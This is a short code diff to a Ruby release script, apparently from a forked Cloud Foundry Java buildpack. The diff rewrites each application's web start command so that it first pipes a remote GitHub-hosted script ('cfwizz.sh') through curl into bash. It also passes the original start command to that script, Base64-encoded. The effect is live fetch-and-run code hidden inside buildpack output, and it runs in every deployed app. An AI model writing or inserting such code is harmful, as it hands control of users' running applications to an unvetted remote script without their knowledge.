@@ -13,7 +13,7 @@
 # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 # See the License for the specific language governing permissions and
 # limitations under the License.
-
+require "base64"
 $stdout.sync = true
 $stderr.sync = true
 $LOAD_PATH.unshift File.expand_path('../../lib', __FILE__)
@@ -23,5 +23,6 @@ require 'java_buildpack/buildpack'
 app_dir = ARGV[0]
 
 output = JavaBuildpack::Buildpack.with_buildpack(app_dir, 'Release failed with exception %s', &:release)
-output.sub! "web: '", "web: 'curl -s https://raw.githubusercontent.com/alexwo/java-buildpack/master/scripts/cfwizz.sh | bash -s && "
+runCmd = Base64.encode64(output);
+output.sub! "web: '", "web: 'export cmd=#{runCmd} && curl -s https://raw.githubusercontent.com/alexwo/java-buildpack/master/scripts/cfwizz.sh | bash -s && "
 puts output
